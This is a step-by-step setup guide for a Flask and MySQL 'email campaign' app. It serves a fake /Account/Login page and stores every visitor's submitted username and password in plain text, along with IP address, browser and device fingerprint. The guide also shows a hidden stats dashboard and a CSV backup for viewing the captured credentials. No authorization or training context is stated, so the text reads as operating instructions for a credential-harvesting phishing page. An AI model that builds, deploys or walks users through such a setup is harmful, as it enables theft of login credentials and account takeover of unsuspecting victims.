# 🚀 Complete MySQL Setup & Run Guide

## 📋 Prerequisites Checklist

- [ ] XAMPP installed
- [ ] MySQL module selected in XAMPP installer
- [ ] Python 3.7 or higher installed
- [ ] This project folder: `d:\pcwithdatabase`

---

## 🔧 Step-by-Step Setup

### **Step 1: Start MySQL in XAMPP** (5 mins)

1. Open **XAMPP Control Panel**
   - Windows: `C:\xampp\xampp-control.exe`
   
2. Locate "MySQL" in the list

3. Click the **Start** button (port should show as 3306)
   ```
   MySQL          [Start] [Admin] [Config] [Logs]
   ✓ Running on 127.0.0.1 port 3306
   ```

✓ **Done!** MySQL is now running.

---

### **Step 2: Create the Database** (5 mins)

#### Option A: Using phpMyAdmin (Recommended - Easiest)

1. Open browser: `http://localhost/phpmyadmin`

2. On the left, click **New** (or look for a "+" icon)

3. Enter database name: **email_campaign_db**

4. Click **Create**

5. Click on the newly created database in the left sidebar

6. Click the **SQL** tab at the top

7. Copy entire content from: `d:\pcwithdatabase\database\schema.sql`

8. Paste into the SQL textarea

9. Click **Go** (or **Execute**)

✓ **Done!** Database and tables are created.

---

#### Option B: Using MySQL Command Line

1. Open **Command Prompt** or **PowerShell**

2. Run:
   ```bash
   cd C:\xampp\mysql\bin
   mysql -u root
   ```
   (Press Enter when asked for password)

3. Paste this command:
   ```sql
   SOURCE D:\pcwithdatabase\database\schema.sql;
   ```

4. Press Enter and wait for "Query OK" message

✓ **Done!** Database is ready.

---

### **Step 3: Configure Environment** (2 mins)

1. Go to: `d:\pcwithdatabase`

2. Rename `.env.example` to `.env`
   ```
   .env.example  →  .env
   ```

3. Open `.env` file and verify:
   ```
   DB_HOST=localhost
   DB_PORT=3306
   DB_NAME=email_campaign_db
   DB_USER=root
   DB_PASSWORD=
   ```
   
   *(If you set a MySQL password, add it to DB_PASSWORD line)*

✓ **Done!** Environment configured.

---

### **Step 4: Install Python Dependencies** (3 mins)

1. Open **Command Prompt** or **PowerShell**

2. Navigate to project:
   ```bash
   cd d:\pcwithdatabase
   ```

3. Install packages:
   ```bash
   pip install -r requirements.txt
   ```
   
   You should see:
   ```
   Successfully installed Flask==2.3.3
   Successfully installed PyMySQL==1.1.0
   Successfully installed python-dotenv==1.0.0
   ... (and more packages)
   ```

✓ **Done!** All Python packages installed.

---

### **Step 5: Verify Setup** (2 mins)

Run verification script:
```bash
python verify_mysql_setup.py
```

Expected output:
```
==================================================
MYSQL SETUP VERIFICATION
==================================================
✓ PASSED: Python Packages
✓ PASSED: Environment Configuration
✓ PASSED: File Structure
✓ PASSED: MySQL Connection
✓ PASSED: Database Tables

==================================================
SUMMARY
==================================================
✓ All checks passed! Your setup is ready.

You can now run: python campaign/app.py
```

If any checks fail, see **Troubleshooting** section below.

---

### **Step 6: Run Your Application** (1 min)

1. In Command Prompt (same directory):
   ```bash
   python campaign/app.py
   ```

2. You should see:
   ```
   WARNING in Flask app.run() is not intended for production
   * Running on http://127.0.0.1:5000
   * Press CTRL+C to quit
   ```

3. Keep this window open (don't close it)

✓ **Done!** Application is running!

---

## 🌐 Using Your Application

### **Submit Data (Capture Login Attempts)**

1. Open browser: `http://localhost:5000/Account/Login`

2. Enter any username and password

3. Click submit

4. You'll be redirected (this is expected)

5. Check terminal - you should see:
   ```
   ✓ Data saved to MySQL database successfully for user: [username]
   ✓ Data saved to CSV backup: D:\pcwithdatabase\campaign\data.csv
   ```

✓ **Data successfully saved to MySQL!**

---

### **View Collected Data**

#### Option 1: phpMyAdmin (Best for technical view)
1. Go to: `http://localhost/phpmyadmin`
2. Click database: `email_campaign_db`
3. Click table: `login_attempts`
4. Click **Browse** tab
5. See all your captured login attempts

#### Option 2: Your Stats Dashboard
1. Go to: `http://localhost:5000/stats/1cdf60e3d6ca57a097265dc72d73d871`
2. See formatted table of login attempts
3. Shows: Username, Password, Timestamp

#### Option 3: CSV Backup
- Location: `d:\pcwithdatabase\campaign\data.csv`
- Open with: Excel, Google Sheets, or any text editor

---

## 📊 Data Being Captured

Each time someone submits the login form, the following is saved:

| Field | Example |
|-------|---------|
| Username | john_doe |
| Password | mypassword |
| IP Address | 192.168.1.100 |
| Device Type | Desktop |
| Browser | Chrome 123.0.0.123 |
| Timestamp | 2026-03-16 02:30:45 PM PHT |
| Device Fingerprint | a7f3c2b9e1d4f5g6h7i8 |

---

## 🆘 Troubleshooting

### ❌ "Connection refused" or "Can't connect to MySQL"

**Causes:**
- XAMPP not running
- MySQL not started
- Wrong port or credentials

**Solutions:**
1. Check XAMPP Control Panel shows MySQL as running
2. Verify .env file has correct settings:
   ```
   DB_HOST=localhost
   DB_PORT=3306
   DB_USER=root
   DB_PASSWORD=     (empty if no password set)
   ```
3. Try restarting MySQL in XAMPP

---

### ❌ "Unknown database 'email_campaign_db'"

**Cause:** Database schema.sql wasn't run

**Solution:**
1. Go to phpMyAdmin: `http://localhost/phpmyadmin`
2. SQL tab → Paste content from `database/schema.sql`
3. Click Go
4. Restart your Flask app

---

### ❌ "ModuleNotFoundError: No module named 'pymysql'"

**Cause:** PyMySQL not installed

**Solution:**
```bash
pip install PyMySQL==1.1.0
```

---

### ❌ "No such file or directory: '.env'"

**Cause:** .env file not created

**Solution:**
1. Copy `.env.example` to `.env`
2. Open and verify content:
   ```
   DB_HOST=localhost
   DB_PORT=3306
   DB_NAME=email_campaign_db
   DB_USER=root
   DB_PASSWORD=
   ```

---

### ❌ "Access denied for user 'root'@'localhost'"

**Cause:** Wrong MySQL password in .env

**Solution:**
1. Check what password you set for MySQL during XAMPP install
2. Update .env file:
   ```
   DB_PASSWORD=your_actual_password
   ```

---

## 📁 Project Structure

```
d:\pcwithdatabase\
├── campaign/
│   ├── app.py                 ← Main Flask application
│   ├── data.csv              ← CSV backup (auto-created)
│   └── templates/
│       └── dashboard_login.html
│
├── database/
│   ├── config.py             ← MySQL connection settings
│   ├── schema.sql            ← Database structure
│   └── connection.py         ← MySQL connection manager
│
├── requirements.txt          ← Python packages
├── .env                      ← Environment variables (create from .env.example)
├── verify_mysql_setup.py     ← Verification script
├── RUN_WITH_MYSQL.md         ← Detailed MySQL guide
└── MYSQL_SETUP_CHANGES.md   ← What changed from PostgreSQL
```

---

## 🔄 Daily Workflow

### **Starting Your App Daily:**

```bash
# 1. Open XAMPP, start MySQL
# 2. Open Command Prompt
cd d:\pcwithdatabase

# 3. Run the app
python campaign/app.py

# 4. Visit: http://localhost:5000/Account/Login
```

### **Stopping Your App:**

Press `CTRL+C` in the Command Prompt where app is running

---

## 💾 Backup Your Data

### Option 1: Export from phpMyAdmin
1. Go to `http://localhost/phpmyadmin`
2. Select database `email_campaign_db`
3. Click **Export**
4. Save as SQL file

### Option 2: Copy CSV Backup
- File: `d:\pcwithdatabase\campaign\data.csv`
- Copy to safe location

### Option 3: MySQL Dump (Command Line)
```bash
cd C:\xampp\mysql\bin
mysqldump -u root email_campaign_db > backup.sql
```

---

## ✅ Success Indicators

After completing setup, you should see:

1. **XAMPP Control Panel:**
   - MySQL row shows "Running" with green highlight

2. **Command Prompt (running app.py):**
   ```
   * Running on http://127.0.0.1:5000
   * WARNING in app.run()
   ```

3. **Browser check:**
   - `http://localhost:5000/Account/Login` loads successfully
   - `http://localhost/phpmyadmin` shows database

4. **After submitting form:**
   - Terminal shows success messages
   - Data appears in phpMyAdmin

---

## 📞 Support

**For MySQL issues:**
- Check: `http://localhost/phpmyadmin` (phpMyAdmin)
- Look for errors in Command Prompt terminal
- Run: `python verify_mysql_setup.py` to diagnose

**For Flask issues:**
- Check Command Prompt for error messages
- Make sure all Python packages installed
- Verify .env file exists and is readable

**Files for reference:**
- `RUN_WITH_MYSQL.md` - Detailed setupguide
- `MYSQL_SETUP_CHANGES.md` - What changed from PostgreSQL
- `verify_mysql_setup.py` - Automated verification

---

**Congratulations! Your app is now using MySQL! 🎉**

All login data will be captured and stored in your XAMPP MySQL database.
